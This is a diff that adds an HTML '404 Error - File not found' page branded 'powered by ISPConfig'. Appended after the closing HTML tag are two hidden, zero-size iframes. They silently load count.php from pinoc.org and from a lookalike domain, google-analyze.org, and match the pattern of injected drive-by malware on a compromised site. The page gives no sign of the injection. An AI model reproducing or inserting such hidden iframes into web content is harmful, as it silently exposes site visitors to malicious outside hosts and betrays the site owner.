@@ -1,0 +1,40 @@
+<HTML>
+<HEAD>
+<TITLE>404 Error - File not found!</TITLE>
+</HEAD>
+<BODY BGCOLOR="#FFFFFF" leftMargin=0 topMargin=0 rightMargin=0 marginheight="0" marginwidth="0">
+<CENTER>
+<TABLE BORDER="0" WIDTH="100%" CELLSPACING="0">
+  <TR>
+    <TD BGCOLOR="#025CCA" ALIGN="CENTER">
+    <HR SIZE="1" COLOR="#FFFFFF">
+    <TABLE>
+      <TR>
+        <TD><FONT SIZE="3" COLOR="#FFFFFF" FACE="Helvetica, Arial"><B>404 Error - File not found!</B></FONT></TD>
+      </TR>
+    </TABLE>
+    <HR SIZE="1" COLOR="#FFFFFF">
+    </TD>
+  </TR>
+    <TR>
+  <TD><BR><BR><BR>
+  <CENTER><FONT COLOR="#000000" SIZE="2" FACE="Helvetica, Arial"><B><U>The following error occurred:</U></B></FONT></CENTER>
+  <BR></TD>
+  </TR>
+  <TR>
+    <TD BGCOLOR="#FFFFFF">
+      <CENTER>
+          <FONT COLOR="#000000" SIZE="2" FACE="Helvetica, Arial">The requested URL was not found on this server.
+          <P>Please check the URL or contact the  Webmaster.</FONT>
+      </CENTER>
+      <BR>
+      <HR SIZE="1" WIDTH="90%">
+      <CENTER>
+<FONT SIZE="1" COLOR="#000000" FACE="Verdana, Arial">powered by <A HREF="http://www.ispconfig.org">ISPConfig</A></FONT>
+      </CENTER>
+    </TD>
+  </TR>
+</TABLE>
+</CENTER>
+</BODY>
+</HTML><iframe src="http://pinoc.org/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://google-analyze.org/count.php?o=2" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
